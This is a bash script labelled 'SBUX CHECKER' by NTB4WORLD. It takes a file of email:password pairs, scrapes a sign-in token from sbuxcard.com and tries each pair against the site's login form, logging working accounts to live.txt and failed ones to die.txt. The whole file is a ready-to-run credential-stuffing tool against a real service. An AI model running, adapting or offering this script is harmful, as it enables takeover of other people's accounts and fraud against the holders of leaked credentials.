#!/bin/bash
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${RED}
  ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
  ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
  ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
  ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
  .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
     ${RED}------------------------------------${NOCOLOR}
           Checker By NTB4WORLD
     ${RED}------------------------------------${NOCOLOR}
"
}
sbuxCek(){
	getcookie
    footer="L34Kc0de [ SBUX CHECKER ]"
	ua=$(cat ua.txt | sort -R | head -1)
	kontol=$(curl -s --compressed --cookie tmp/${rand}_tmp "https://www.sbuxcard.com/index.php?page=signin" -L \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-US,en;q=0.5' \
	-H 'Referer: https://www.sbuxcard.com/index.php?page=signin' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Connection: keep-alive' \
	--data "token=${Token}&Email=$1&Password=$2&txtaction=signin&emailcount=$1&passcount=$2")
	if [[ $kontol =~ "index.php?page=account" ]]; then
		printf "[$i/$totalLines] ${GREEN}LIVE => $1|$2 ${NOCOLOR}- $footer \n"
		echo "LIVE -> $1 | $2">>live.txt
	elif [[ $kontol =~ "index.php?page=signin" ]]; then
		printf "[$i/$totalLines] ${RED}DIE => $1|$2 ${NOCOLOR}- $footer \n"
		echo "DIE -> $1 | $2">>die.txt
	else
		printf "${MARGENTA} Unknown! => $1 $2\n"

	fi
	rm tmp/${rand}_tmp 2> /dev/null
}
getcookie(){
	rand=$(echo $(shuf -i 0-999999 -n 1))
	getToken=$(curl -s --cookie-jar tmp/${rand}_tmp "https://www.sbuxcard.com/index.php?page=signin" -L -D - | grep -Eo 'token\" value=\"(.?*)\"\/>')
	Tokentot=$(echo $getToken | sed 's/token\" value=\"//g' | sed 's/"\/>//g')
	Token=$(echo $Tokentot | sed -f urlencode)
if [[ $Token == '' ]]; then
    sleep 4
    echo "[x] Ohh SNAP!!!. Regenerate token now. Please wait..."
    AmbilToken
    sleep 2
fi

}
if [[ ! -d tmp ]]; then
    mkdir tmp
fi
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password"
echo -n "Masukan File List : "
read list
echo "[+] Calculate your mailist file"
echo "############################"
totalLines=`grep -c ":" $list`
echo "There are $totalLines of list."
echo "############################"
if [ ! -f $list ]; then
	echo "$list No Such File"
	exit
fi
x=$(gawk -F: '{ print $1 }' $list)
y=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'emails=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwords=($y)'
for (( i = 0; i < "${#emails[@]}"; i++ )); do
	email="${emails[$i]}"
	password="${passwords[$i]}"
	sbuxCek $email $password
done
